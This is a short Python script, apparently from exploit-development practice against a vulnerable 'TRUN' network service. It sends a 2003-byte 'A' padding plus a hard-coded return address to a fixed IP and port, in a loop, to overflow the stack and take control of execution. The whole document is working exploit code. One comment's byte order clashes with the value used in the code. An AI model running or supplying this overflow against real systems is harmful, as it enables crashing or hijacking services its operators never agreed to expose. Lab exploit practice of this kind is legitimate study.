#!/usr/bin/python

# Generating malicious shellcode

import sys, socket

host = '172.16.10.101'
port = 9999

	# first return address 625011af
	# \xaf\x11\x50\xaf
	# in reverse (intel processor little endian)
	# high order byte; highest address
	# low order byte; lowest address

shellcode = 'A' * 2003 + '\xaf\x11\x50\x62'

def inject_shellcode(host, port, payload):

	while True:
		try:
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

			s.send(('TRUN /.:/' + payload))
			s.close()
	
		except:
			print "Error connecting to the server.."
			sys.exit()


if __name__ == '__main__':
	inject_shellcode(host, port, shellcode)
